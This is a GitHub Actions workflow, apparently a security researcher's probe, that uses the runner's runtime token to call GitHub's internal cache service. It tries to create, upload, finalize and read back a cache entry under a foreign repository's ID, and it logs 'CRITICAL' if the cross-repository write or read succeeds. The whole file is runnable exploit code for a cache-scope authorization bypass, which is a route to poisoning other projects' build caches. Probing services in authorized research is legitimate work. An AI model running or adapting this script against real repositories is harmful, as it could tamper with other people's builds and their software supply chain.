name: Cache Cross-Repo Probe v1
on:
  workflow_dispatch:
permissions:
  contents: read
  actions: read
jobs:
  cross-repo-cache:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            const crypto = require('crypto');
            const env = process.env;
            const resultsUrl = env.ACTIONS_RESULTS_URL;
            const token = env.ACTIONS_RUNTIME_TOKEN;
            const version = crypto.createHash('sha256').update('/tmp/probe|zstd').digest('hex');
            const timestamp = Math.floor(Date.now()/1000);
            const probeKey = `cross-scope-probe-${timestamp}`;
            
            // Foreign repo = toofikz4/public-test-repo (ID 1187665821)
            const foreignRepoId = '1187665821';
            const twirpBase = `${resultsUrl}twirp/github.actions.results.api.v1.CacheService`;
            const headers = {
              'Authorization': `Bearer ${token}`,
              'Content-Type': 'application/json'
            };
            
            console.log(`Probe key: ${probeKey}`);
            console.log(`Version: ${version}`);
            console.log(`Foreign repo ID: ${foreignRepoId}`);
            
            // Step 1: CreateCacheEntry with foreign repositoryId
            console.log('\n=== Step 1: CreateCacheEntry with foreign repoId ===');
            const createResp = await fetch(`${twirpBase}/CreateCacheEntry`, {
              method: 'POST', headers,
              body: JSON.stringify({
                key: probeKey, version,
                metadata: {
                  repositoryId: foreignRepoId,
                  scope: [{scope: 'refs/heads/main', permission: 3}]
                }
              })
            });
            const createData = await createResp.json();
            console.log(`Create status: ${createResp.status}`);
            console.log(`Create ok: ${createData.ok}`);
            
            if (!createData.ok || !createData.signed_upload_url) {
              console.log('Create failed, aborting');
              return;
            }
            
            const uploadUrl = createData.signed_upload_url;
            console.log(`Upload URL host: ${new URL(uploadUrl).hostname}`);
            console.log(`Upload URL path prefix: ${new URL(uploadUrl).pathname.substring(0, 30)}`);
            
            // Step 2: Upload data to the signed URL
            console.log('\n=== Step 2: Upload probe data ===');
            const probeData = `CROSS_SCOPE_PROBE_DATA_${timestamp}_FROM_TOOFORG`;
            const uploadResp = await fetch(uploadUrl, {
              method: 'PUT',
              headers: {
                'Content-Type': 'application/octet-stream',
                'Content-Length': probeData.length.toString(),
                'x-ms-blob-type': 'BlockBlob'
              },
              body: probeData
            });
            console.log(`Upload status: ${uploadResp.status}`);
            if (uploadResp.status !== 201) {
              console.log(`Upload body: ${await uploadResp.text()}`);
            }
            
            // Step 3: Finalize the cache entry
            console.log('\n=== Step 3: FinalizeCacheEntryUpload ===');
            const finalizeResp = await fetch(`${twirpBase}/FinalizeCacheEntryUpload`, {
              method: 'POST', headers,
              body: JSON.stringify({
                key: probeKey, version,
                sizeBytes: probeData.length.toString(),
                metadata: {
                  repositoryId: foreignRepoId,
                  scope: [{scope: 'refs/heads/main', permission: 3}]
                }
              })
            });
            const finalizeData = await finalizeResp.json();
            console.log(`Finalize status: ${finalizeResp.status}`);
            console.log(`Finalize ok: ${finalizeData.ok}`);
            console.log(`Finalize data: ${JSON.stringify(finalizeData)}`);
            
            // Step 4: Verify - try to GET the cache entry with OWN repoId
            console.log('\n=== Step 4: GET with own repoId ===');
            const getOwnResp = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
              method: 'POST', headers,
              body: JSON.stringify({key: probeKey, version})
            });
            const getOwnData = await getOwnResp.json();
            console.log(`Get own: ok=${getOwnData.ok}, matched_key=${getOwnData.matched_key}`);
            
            // Step 5: Verify - try to GET with FOREIGN repoId
            console.log('\n=== Step 5: GET with foreign repoId ===');
            const getForeignResp = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
              method: 'POST', headers,
              body: JSON.stringify({
                key: probeKey, version,
                metadata: {
                  repositoryId: foreignRepoId,
                  scope: [{scope: 'refs/heads/main', permission: 3}]
                }
              })
            });
            const getForeignData = await getForeignResp.json();
            console.log(`Get foreign: ok=${getForeignData.ok}, matched_key=${getForeignData.matched_key}`);
            
            if (getForeignData.ok && getForeignData.signed_download_url) {
              console.log('CRITICAL: Foreign repo cache entry accessible!');
              console.log(`Download URL: ${getForeignData.signed_download_url.substring(0, 100)}...`);
            }
            
            // Step 6: Also create with OWN repoId for comparison
            console.log('\n=== Step 6: Create with OWN repoId for comparison ===');
            const ownKey = `own-scope-probe-${timestamp}`;
            const createOwnResp = await fetch(`${twirpBase}/CreateCacheEntry`, {
              method: 'POST', headers,
              body: JSON.stringify({key: ownKey, version})
            });
            const createOwnData = await createOwnResp.json();
            console.log(`Create own: ok=${createOwnData.ok}`);
            
            if (createOwnData.ok) {
              await fetch(createOwnData.signed_upload_url, {
                method: 'PUT',
                headers: {'Content-Type': 'application/octet-stream', 'x-ms-blob-type': 'BlockBlob'},
                body: `OWN_SCOPE_DATA_${timestamp}`
              });
              await fetch(`${twirpBase}/FinalizeCacheEntryUpload`, {
                method: 'POST', headers,
                body: JSON.stringify({key: ownKey, version, sizeBytes: '30'})
              });
              
              const getOwnCreated = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
                method: 'POST', headers,
                body: JSON.stringify({key: ownKey, version})
              });
              const ownCreatedData = await getOwnCreated.json();
              console.log(`Get own-created: ok=${ownCreatedData.ok}, matched_key=${ownCreatedData.matched_key}`);
            }
            
            console.log('\n=== FINAL VERDICT ===');
            console.log(`Foreign create: ${createData.ok ? 'ACCEPTED' : 'REJECTED'}`);
            console.log(`Foreign finalize: ${finalizeData.ok ? 'ACCEPTED' : 'REJECTED'}`);
            console.log(`Foreign GET: ${getForeignData.ok ? 'FOUND (CRITICAL!)' : 'NOT FOUND'}`);
